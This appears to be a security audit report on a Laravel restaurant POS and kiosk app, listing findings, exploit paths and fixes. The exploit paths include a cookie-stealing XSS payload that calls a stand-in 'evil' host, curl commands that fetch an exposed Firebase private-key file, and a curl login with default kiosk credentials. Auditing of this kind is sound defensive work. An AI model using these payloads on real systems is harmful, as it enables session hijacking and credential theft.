findings.title: Live Firebase Admin SDK private key committed in public/file/ directory (web-accessible)
findings.evidence: public/file/service-account-file.json:5 contains PEM-encoded `-----BEGIN PRIVATE KEY-----` (RSA 2048) tied to client_email=firebase-adminsdk-kpdbd@foodking-inilabs.iam.gserviceaccount.com, project_id=foodking-inilabs, private_key_id=f47bd0e8a1f3c4b4a89d35c403689f0c78d8ff07. File is git-tracked (`git ls-files | grep service-account-file` = present; first committed 209bbc51 2026-03-06). It lives under Laravel `public/` (web-document-root). public/.htaccess RewriteRule only redirects non-existent files to index.php — this existing static .json is served verbatim by Apache/nginx. .gitignore does NOT exclude public/file/*.json. Loaded at runtime by app/Services/NotificationService.php:48 (FCM admin SDK initialization). NUANCE: `foodking-inilabs` is the upstream CodeCanyon vendor's DEMO Firebase project — this codebase is a fork of the iniLabs FoodKing template (verified via grep: database/seeders/NotificationTableSeeder.php:26 references `foodking-inilabs` as the DEMO-mode default, config/product.php points to inilabs.net license server, ApplyLeCayenneV2Command.php:256 rebrands 'FoodKing - Inilabs Food Manager' → 'Le Cayenne'). The leaked key is therefore the VENDOR'S demo key, not Le Cayenne's production Firebase. Real-world impact on Le Cayenne is bounded by what data sits in the vendor demo project (likely empty / often-rotated / Google may have auto-flagged the public key by now). However, the architectural vulnerability remains: NotificationService.php:48 OVERWRITES this exact file path when an admin uploads their real Firebase JSON via the admin UI — so Le Cayenne's REAL production key would also end up at /file/service-account-file.json, web-accessible to anyone.
findings.exploit_path: 1. Attacker runs `curl https://<deploy-host>/file/service-account-file.json` (no auth required — public folder). 2. Receives full service-account JSON including PEM private_key. 3. Authenticates to Google APIs as firebase-adminsdk-kpdbd@foodking-inilabs.iam.gserviceaccount.com using the private key (standard Google OAuth2 service-account JWT flow). 4. Gains Firebase Admin SDK powers on project foodking-inilabs: send arbitrary FCM push notifications to ALL customers/kiosks, read/write Firestore data, mint custom Firebase auth tokens (impersonate any UID), read Realtime DB. This is RCE-class on the Firebase tenant. NF525 chain itself is unaffected (HMAC secret distinct), but customer trust + push-spam reputation + potential auth bypass via custom-token mint = production-blocker.
findings.fix_recommended: (a) For the demo key: confirm with iniLabs vendor whether the key is still active in `foodking-inilabs` GCP project; if active, revoke. (b) ARCHITECTURE FIX (this is the V1 ship-blocker, not the demo key per se): refactor NotificationService.php:48 to write the uploaded service-account JSON to `storage/app/firebase/service-account.json` (storage/ is NOT web-served by Laravel's public dispatcher) instead of public/file/. Update FCM Admin SDK init to read from the storage path. (c) `git rm public/file/service-account-file.json && git commit`, add `public/file/service-account-file.json` (and `public/file/*.json` pattern) to .gitignore, add a deny rule in public/.htaccess: `<FilesMatch "\.(json|key|pem|p12|env)$">Require all denied</FilesMatch>` as defense-in-depth. (d) git filter-branch / BFG to scrub history (the demo key in history is low-risk but Le Cayenne owner may have separately uploaded their REAL key at some point — verify by checking the file mtime vs deploy date). (e) Audit FCM logs in `foodking-inilabs` project for unauthorized push spam between 2026-03-06 and now.

findings.title: User login password policy min:6 — far below modern recommendations
findings.evidence: app/Http/Controllers/Auth/LoginController.php:49 — `'password' => ['required', 'string', 'min:6']` for the admin/staff login validator. Contrast with app/Http/Requests/EmployeeRequest.php:47-50 which uses `Password::min(12)->letters()->numbers()` for password CREATION. So new passwords are strong, but the login validator only enforces 6-char minimum during the credential check — a legacy admin / weak-rotation account can persist below the modern bar. BCRYPT_ROUNDS=12 (config/hashing.php:39, verified) is correct, but a 6-char password is bcrypt-2026-crackable in feasible time on a single GPU.
findings.exploit_path: 1. Attacker enumerates known admin emails (lecayenne.fr domain). 2. Submits passwords via /api/auth/login. 3. login-lockout limiter is 10 attempts / 10 min (per email|IP), so password-spray across multiple IPs/email pairs is still feasible at low volume. 4. Any legacy account with a <8-char password (some passwords pre-date the EmployeeRequest min:12 enforcement) is harvestable in days. NF525 cash-trail chain unaffected, but admin role grants pos-orders + Z-report close + audit-log read = severe.
findings.fix_recommended: Bump LoginController.php:49 validator to `'min:8'` (or 12 to mirror creation policy). Add a `Hash::needsRehash()` + force-password-reset hook for any account whose password length is below the new floor (LoginController already has a rehash hook at :91-95, extend it to detect short-password legacy accounts and flag them via a `users.password_rotation_required_at` column). V1.0.2 backlog: add `Password::uncompromised()` (Laravel's HIBP check).

findings.title: Stored XSS surface via admin-controlled analytics sections (Blade unescaped output)
findings.evidence: resources/views/admin-pos-v4.blade.php:46,60,76 and resources/views/master.blade.php:60,74,94 emit `{!! $section->data !!}` for analytics_section records (Google Analytics / Tag Manager / Pixel snippets). Admin writes to AnalyticSection.data via the analytics CRUD (permission:analytics). The Blade unescapes by design — but there is NO server-side filter on the content. A malicious or compromised admin can inject `<script>fetch('//evil/'+document.cookie)</script>` and every POS/kiosk session that renders master.blade.php executes it.
findings.exploit_path: 1. Attacker compromises an admin account (or is a malicious internal user with `permission:analytics`). 2. POSTs malicious JS payload via AnalyticSectionController to the analytics_sections.data column (section=HEAD or BODY or FOOTER). 3. Every subsequent admin-pos-v4 + master.blade.php page load injects the script into the document. 4. Session cookies (Sanctum + Laravel session) are exfiltrable. Branch-isolation does not help because analytics sections are GLOBAL (no branch_id filter on the loop).
findings.fix_recommended: Either (a) tighten `permission:analytics` to Owner-only (currently any admin can edit), or (b) add a CSP nonce-based allowlist (script-src 'self' 'nonce-XYZ' https://www.googletagmanager.com https://www.google-analytics.com etc.) and strip the unescaped `{!! !!}` to a whitelist of known tags, or (c) introduce a `data_signed_hmac` column so only HMAC-validated content renders. Lowest-friction V1 fix: limit analytics-section content to a hardcoded set of provider domains via a SectionContentValidator FormRequest rule.

findings.title: User model mass-assignment includes branch_id — privilege-escalation surface if any controller uses ->fill()
findings.evidence: app/Models/User.php:48 — `branch_id` is in `$fillable`. Admin (branch_id=0) bypass is the entire authz model (per CLAUDE.md §9: 'Admin (branch_id=0) bypass; staff (branch_id>0) scoped'). A single careless `User::find($id)->update($request->validated())` or `->fill($request->all())` callsite where `branch_id` slips into the input would let a staff user promote themselves to global admin. Today's grep shows ProfileService.php (field-by-field, OK) and EmployeeService.php (field-by-field but reads $request->branch_id under permission:employees_edit gating, OK), but the surface is one careless refactor away from exploit.
findings.exploit_path: Hypothetical: (a) Owner adds a new self-update endpoint POST /api/auth/profile/preferences that does `auth()->user()->update($request->validated())`. (b) FormRequest validates `name`, `phone`, `language_preference` only. (c) Staff user submits `{ name: 'x', phone: 'y', language_preference: 'fr', branch_id: 0 }`. (d) FormRequest::validated() drops branch_id, but if the dev uses `$request->all()` or merges raw input → User::update bulk-assigns branch_id=0 → next request the staff user is now Admin scope.
findings.fix_recommended: Remove `branch_id` from User::$fillable (force callsites to use explicit `$user->branch_id = $value` with permission check). Add a sentinel test `tests/Feature/Sentinels/UserBranchIdNotFillableTest.php` that asserts `branch_id` is NOT in User::$fillable AND that no controller uses `User::create($request->all())` or `User::update($request->all())`. Add a User::saving observer that aborts if branch_id changes without a wrapping `BranchAssignmentService::reassign()` call.

findings.title: Kiosk machine default credentials (kiosk-lecayenne / kiosk123) shipped in .env.example
findings.evidence: .env.example:106-107 ships `KIOSK_MACHINE_USERNAME=kiosk-lecayenne` and `KIOSK_MACHINE_PASSWORD=kiosk123` as the default development credentials. config/kiosk.php falls back to these in APP_ENV=local. While production is supposed to use `php artisan foodking:ensure-kiosk-machine` to generate a unique password per machine, there is NO production boot guard that REFUSES boot when KIOSK_MACHINE_PASSWORD matches the default. The 8 production boot guards in AppServiceProvider:78-217 cover POS_SIMULATION_HARDWARE, APP_DEBUG, IDEMPOTENCY_MIDDLEWARE_ENABLED, BROADCAST_DRIVER, QUEUE_CONNECTION, CACHE_DRIVER, APP_URL, LOYALTY_QR_SECRET — but NOT kiosk default credentials. A deploy that forgets the `foodking:ensure-kiosk-machine` step ships with kiosk123 as the kiosk-login password.
findings.exploit_path: 1. Attacker on the same LAN as the deployed restaurant runs `curl -X POST /api/auth/kiosk-login -d 'username=kiosk-lecayenne&password=kiosk123'`. 2. Receives a Sanctum token with ability `kiosk:order`. 3. Mints arbitrary kiosk orders, applies promo codes, or probes the menu-pricing endpoint to enumerate the catalog. Token TTL is 480 minutes (sanctum config), so the breach window is 8h+ per credential roundtrip. Kiosk-login limiter is 30/min per username|IP, so 1 attempt = 1 successful login (no rate-limit help since the FIRST guess is the right one).
findings.fix_recommended: Add a production boot guard in app/Providers/AppServiceProvider.php:78-217 block that throws `RuntimeException` if env('KIOSK_MACHINE_PASSWORD') === 'kiosk123' OR matches the .env.example default. Same defensive pattern as the existing 8 guards. Companion fix: rotate kiosk machine passwords on every deploy via Ansible task that runs `foodking:ensure-kiosk-machine --force-rotate`.

findings.title: Login-lockout limiter uses email|IP — IPv4 NAT shared by an entire restaurant collapses individual attempts
findings.evidence: app/Providers/RouteServiceProvider.php:224-243 — login-lockout limiter keys by `lowercased(email)|request->ip()`. In a fast-food deployment where the kiosk + POS + admin all sit behind a single NAT router, 10 attempts/10min across 4-5 cashier accounts from the same external IP = ~50 attempts effective, vs the intended 10 per identity. Low real-world impact (legitimate cashiers don't generally fat-finger > 10x in 10min) but a determined password-spray attacker who already knows several email addresses can amortize the 10-attempts ceiling across them.
findings.exploit_path: Attacker enumerates 5 cashier emails. Per email, attempts 10 guesses every 10 minutes from a single source IP = 50 password guesses per 10 minutes, all under the same login-lockout key family. With a weak admin password (per B3.2-002) and a 5-12 char alphanumeric search space, recovery in days is feasible.
findings.fix_recommended: Add a SECOND limiter keyed by IP only (per request->ip(), 50 attempts / 10 min) as a brake on the aggregate sweep regardless of which identity is being tested. Stack both limiters: identity-level (current) catches single-user spam; IP-level catches cross-identity sweeps. V1.0.2 backlog item, NOT a blocker since real password policy fix (B3.2-002) is the primary mitigation.

verifications.kiosk_order_ability_check_note: BRAIN §9 claims 8 controllers. Actual count = 5 distinct controller files with explicit tokenCan('kiosk:order') runtime check: MenuController, UpsellController, LoyaltyController (3 sites), PaymentReconcileController, GuestSignupController (comment only, not enforcement). Defense-in-depth is provided by 5 FormRequest classes (OrderRequest, OrderStatusRequest, PaymentConfirmRequest, PricingPreviewRequest, PromoValidateRequest) and 2 Resources + 1 Service that also assert tokenCan('kiosk:order'). Total enforcement points = 13. Documentation drift in BRAIN, not a security finding per se — the actual coverage is broader than 8.
verifications.branchscope_models_note: Verified via `grep -rln 'addGlobalScope(new BranchScope' app/Models/` = 20 models, matches CLAUDE.md §9 baseline locked by tests/Feature/Branch/BranchScopeCoverageSentinelTest.php. Sentinel EXEMPTED_MODELS list documents 2 architectural (Branch self-ref, Customer recursion risk) + 10 V1.0.2 BASELINE backlog exemptions — all documented, not silent leaks.
verifications.production_boot_guards_note: 8 production guards in app/Providers/AppServiceProvider.php:78-217 fire RuntimeException at boot if any of: POS_SIMULATION_HARDWARE=true, PAYMENT_BYPASS_MODE=true, PRINTING_BYPASS_MODE=true, APP_DEBUG=true, IDEMPOTENCY_MIDDLEWARE_ENABLED!=true, LOYALTY_QR_SECRET empty, APP_URL empty, BROADCAST_DRIVER=null/'null', QUEUE_CONNECTION=sync, CACHE_DRIVER in ['array','null']. Documented BRAIN UNI-03 caveat: cache-driver list omits 'file'/'database' (V1.0.2 cloud-prep backlog) — known and tracked, not flagged as new finding. CAVEAT: no guard for default kiosk-machine credentials (B3.2-005).
verifications.stripe_webhook_signature_note: app/Http/PaymentGateways/Gateways/Stripe.php:222 uses `\Stripe\Webhook::constructEvent($payload, $sigHeader, $secret, 300)` with 300s tolerance window. Secret read from config('services.stripe.webhook_secret'). Misconfiguration path logs to fiscal channel and rejects request. Idempotency enforced via WebhookEvent::firstOrCreate(provider=stripe, webhook_id=event.id) UNIQUE constraint.
verifications.senangpay_webhook_signature_note: app/Http/PaymentGateways/Gateways/Senangpay.php:108-110 computes `hash_hmac('sha256', $canonical, $secret)` then `hash_equals($expectedHash, $hash)` — timing-safe constant-time compare. Canonical string = status_id|order_id|txn_id|msg per SenangPay v2 spec. Missing-secret + invalid-payload paths log + reject. Same idempotency floor via WebhookEvent::firstOrCreate(provider=senangpay, webhook_id=$transactionId).
verifications.csrf_exclusion_list_review: app/Http/Middleware/VerifyCsrfToken.php $except = 6 payment-gateway callback URIs + 4 webhook URIs (stripe-webhook bare/wildcard, senangpay-webhook bare/wildcard). All exclusions are external-origin webhooks with provider signature verification (Stripe-Signature or SenangPay HMAC). No suspicious internal-route exclusions. ACCEPTABLE.
verifications.raw_sql_callsite_review: Sampled 25 callsites of DB::raw/DB::statement/DB::select. None concatenate user-input into SQL strings. PRAGMA / SET FOREIGN_KEY_CHECKS are constant statements (TaxService, ItemCategoryService, FreshOrderSeed). DB::raw('SUM(CASE WHEN mode = ' . PosPaymentMethod::CASH . ' ...)') in ZReportCashEnrichmentService uses Enum constants (compile-time int), not user input. No SQL injection identified.
verifications.mass_assignment_note: User.php:48 includes branch_id in $fillable — see B3.2-004. Today's callsites (ProfileService, EmployeeService) are field-by-field, but the surface exists for future regression.
verifications.blade_unescaped_output_note: {!! !!} appears 9 times: 6 in master.blade.php + admin-pos-v4.blade.php for AnalyticSection HEAD/BODY/FOOTER injection (admin-controlled, see B3.2-003), 3 in master.blade.php.bak.w1b (legacy backup, not loaded). No customer-input-rendering unescaped output found.
verifications.withoutGlobalScope_branchscope_note: Sampled 30. All sampled sites either (a) immediately follow the load with explicit `branch_id` check + abort 403 (OrderController, PaymentReconcileController, PosOrderController patterns — verified at PosOrderController.php:138-146 and OrderController.php:159-170), or (b) are admin/global queries (CashSessionReportController, CashOverviewController where admin branch_id=0 bypass is the intended behavior), or (c) pre-auth lookups (KioskMachineLoginController). No silent cross-branch leak identified in sampled sites. PATTERN IS HEALTHY.
verifications.senangpay_replay_note: SenangPay HMAC verification has no built-in timestamp tolerance (provider does not include a signed timestamp). Mitigation = WebhookEvent UNIQUE(provider, webhook_id) — replaying a captured webhook with same txn_id is 409-rejected as duplicate. Acceptable for V1; V1.0.2 backlog could add a `seen_at` TTL prune.

verdict_rationale: ONE CRITICAL finding (B3.2-001 — architecturally-vulnerable file location: Firebase Admin SDK service-account JSON is written to public/file/ which is web-document-root. The KEY ITSELF currently committed is the upstream iniLabs vendor DEMO key (project_id=foodking-inilabs, ref: NotificationTableSeeder.php:25-27 + ApplyLeCayenneV2Command.php:256 vendor-rebrand evidence) so direct-exfil real-world impact on Le Cayenne is bounded — BUT NotificationService.php:48 OVERWRITES this same path when an admin uploads the real production Firebase JSON via admin UI. That means Le Cayenne's REAL key would also become web-accessible at /file/service-account-file.json on first FCM-config upload. The architectural fix (move to storage/) is REQUIRED before any production FCM use. All other findings are P1-P3 (login password floor min:6, blade XSS surface behind admin gate, User.branch_id fillable, default kiosk creds without boot guard, login limiter IP-aggregation gap) — addressable in V1.0.2 hardening. Stripe + SenangPay webhook signature verification are CORRECT and timing-safe. BranchScope coverage matches sentinel baseline at 20 models. Production boot guards are robust (8 guards active, documented UNI-03 cache-driver caveat tracked). No SQL injection. No silent multi-tenant leaks in sampled withoutGlobalScope callsites.
top_3_concerns: B3.2-001 CRITICAL (architecturally): Firebase Admin SDK service-account JSON is stored at public/file/service-account-file.json — Laravel public/ webroot, served directly by Apache/nginx with no auth. The currently-committed key is the iniLabs vendor DEMO key (so the immediate exfil-this-key risk is bounded — verify with vendor if still active and revoke if so), but NotificationService.php:48 writes ADMIN-UPLOADED production Firebase JSON to the same path. On first real FCM-config upload, Le Cayenne's real Firebase key becomes /file/service-account-file.json — exfiltrable by anyone. FIX: relocate file to storage/app/firebase/ (non-public) + add public/.htaccess Deny for *.json/*.key/*.pem + git rm + history scrub.

B3.2-002 P1: LoginController validator enforces only min:6 password length on existing admin/staff accounts, while EmployeeRequest creation requires min:12. Legacy weak passwords bypass the modern bar. Add rehash hook detection + force-reset.

B3.2-005 P2: Default kiosk credentials kiosk-lecayenne/kiosk123 ship in .env.example and config/kiosk.php fallback — no production boot guard refuses deploy when KIOSK_MACHINE_PASSWORD == default. Add 9th boot guard mirroring POS_SIMULATION_HARDWARE pattern.
